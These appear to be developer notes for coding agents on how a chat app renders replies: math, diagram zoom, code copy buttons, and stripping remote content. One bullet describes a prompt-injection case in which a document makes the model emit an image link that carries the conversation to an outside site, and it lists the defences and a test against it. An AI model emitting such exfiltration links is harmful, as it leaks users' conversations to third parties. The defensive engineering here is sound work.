# Rendering replies: Markdown, math, diagrams, code, remote content

Part of the notes for coding agents; [AGENTS.md](../AGENTS.md) has the overview and the index.

- **`plain()`** (Markdown → text) feeds canvas card previews *and* the search index: changing it changes every index entry's signature (they're rewritten as conversations are next saved or backfilled). Inline LaTeX goes through `texText`; display math becomes "[equation]".
- **Model text never fetches from another site by itself** (`renderRich` without `{doc:true}`: replies, takeaways, cards, the guide; and every diagram's svg): a document can prompt-inject `![](https://site/?q=<conversation>)`. `purifyNoRemote` runs DOMPurify with the `noRemote` hooks: an `<img>` from another origin keeps its address in `data-rsrc` and becomes a `.rimg` placeholder (`remoteImg`; its words come from CSS `attr()`, so it adds no text and anchors are unchanged; its button loads it, remembered for the visit in `RIMG_OK`, into a `rimgBox`: `.rimgbox > .mm-view > img` plus `MM_BAR`, framed like a diagram, at most `min(50vh,420px)` tall, the diagram zoom (`mmZoom` takes the view's `svg` or `img`; every handler looks for `.mermaid-box,.rimgbox`), and a click on the image while not zoomed opens the lightbox with `{url}`; it adds no text, so anchors are unchanged); `srcset`, `poster`, `background`, `ping`, a remote `src`/`data`/svg `href`, and CSS with a remote `url()`, `@import`, `image-set` or a backslash escape are dropped. Mermaid's `secure` list stops a diagram's `%%{init}%%` from setting `themeCSS` or fonts. The document itself (`{doc:true}`) is rendered as before. `tests/test_reply_rest_and_images.py` routes a fake attacker site and checks nothing reaches it.
- **Math while streaming:** `renderRich` typesets complete `$…$` / `$$…$$` even while a reply streams, through `texSvg` (a cache of typeset formulas, cloned); unclosed ones stay raw until they close.
- **Diagram zoom** (no wheel or pinch, on purpose: scrolling over a diagram scrolls the chat): a diagram fits in `max-height:60vh` at first; a drawn diagram is `.mm-view` (the svg, `overflow:hidden`) + `MM_BAR` (`data-mmz`: tog, in, out, fit, l/u/d/r) inside its `.mermaid-box`. The zoom is the svg's width (`mmZoom`, `data-k`), the pan is the view's scroll position (`mmMove`; holding an arrow glides, `mmHold`); the box keeps its height while zoomed; zoomed in (`data-k`), dragging the view moves it (`touch-action:none` only then, so at fit a swipe scrolls the chat). No strip on touch-only devices (`hover:none` and `pointer:coarse`): the browser's pinch-zoom does it there. Zoom starts from the drawn width, which the height cap can make narrower than the svg's box. Nothing is saved. The click is handled before the canvas card block, so it works in cards. `tests/test_mermaid_zoom.py`. A reply's loaded image uses the same strip and code (`.rimgbox`, see above); don't give `.rimgbox` the `mermaid-box` class: theme switches re-render every `.mermaid-box` from its `data-src`.
- **Code blocks' copy button** (`renderRich` wraps each `<pre>` in a `.cbx` with a `.cpy` button; a capture-phase click handler copies the code): outside the `<pre>` so it stays put when the code scrolls sideways, and an icon only, so it adds no text and anchors are unchanged. Its `pointerdown` is stopped so a canvas card doesn't take the press. While a reply streams, `renderRich` puts the same button elements back after each redraw (so "Copied" stays), and a press a redraw interrupted copies on `pointerup` (`cpyPress`), since the browser sends no click once the pressed element has left the page, even if it's put back; a block whose fence is still open gets no button yet. Every copy goes through `copyText`: the clipboard API exists only on https or localhost, so over plain http (a tailnet address) it falls back to `execCommand('copy')`. `tests/test_code_copy.py`.
- **Diagrams that fail** (`showMermaidSrc`) say why, show mermaid's error and the source, and offer "Ask for a fix" (fills the pane's composer; never sends). `tests/test_mermaid_fallback.py`.
